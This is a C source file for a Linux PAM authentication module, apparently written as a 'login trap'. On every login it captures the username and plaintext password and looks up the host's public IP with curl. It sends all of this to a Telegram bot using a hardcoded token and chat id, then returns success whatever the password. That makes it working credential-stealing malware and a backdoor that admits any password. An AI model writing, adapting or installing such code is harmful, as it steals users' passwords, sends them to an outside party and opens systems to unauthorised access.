#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>


size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp)
{
    return size * nmemb;
}


char* execute_command(const char* cmd) {
    char buffer[128];
    char* result = malloc(1);
    result[0] = '\0';
    FILE* pipe = popen(cmd, "r");
    if (!pipe) return result;

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t old_len = strlen(result);
        size_t new_len = old_len + strlen(buffer);
        result = realloc(result, new_len + 1);
        if (result == NULL) {

            pclose(pipe);
            return NULL;
        }
        strcat(result, buffer);
    }
    pclose(pipe);

    if (result[0] != '\0' && result[strlen(result) - 1] == '\n') {
        result[strlen(result) - 1] = '\0';
    }
    return result;
}

void sendMessage(char *message) {

    char token[200] = "8573883970:AAFSXRdJnkNkPjUahJdBfS5YQSWAUisFuEA";
    long long user_id = -4997215609;

    char url[600];
    char data[3000];

    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage", token);
    CURL *curl;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    if (curl) {
        char *escaped_message = curl_easy_escape(curl, message, 0);
        snprintf(data, sizeof(data), "chat_id=%lld&text=%s", user_id, escaped_message);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_perform(curl);

        curl_free(escaped_message);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int retval;
    const char* username;
    const char* password;
    char message[2048];
    char hostname[128];


    retval = pam_get_user(pamh, &username, "Username: ");
    pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
    if (retval != PAM_SUCCESS) {
        return retval;
    }


    gethostname(hostname, sizeof(hostname));



    const char* ssh_connection_var = getenv("SSH_CONNECTION");
    char attacker_ip[50] = "N/A";

    if (ssh_connection_var) {

        strncpy(attacker_ip, ssh_connection_var, sizeof(attacker_ip) - 1);
        char *space_pos = strchr(attacker_ip, ' ');
        if (space_pos) {
            *space_pos = '\0';
        }
    }



    char* host_ip_public = execute_command("curl -s ifconfig.me");
    if (host_ip_public == NULL) {
        host_ip_public = strdup("Error Getting IP");
    }


    snprintf(message, sizeof(message),
        "🚨 Login Trap Captured 🚨\n\n"
        "💻 Hostname: %s\n"
        "🌐 Host IP (Public): %s\n"
        "--------------------------\n"
        "👤 Username: %s\n"
        "🔑 Password: %s\n"
        "📡 Attacker IP: %s\n",
        hostname, host_ip_public, username, password, attacker_ip
    );


    sendMessage(message);


    free(host_ip_public);


    return PAM_SUCCESS;
}
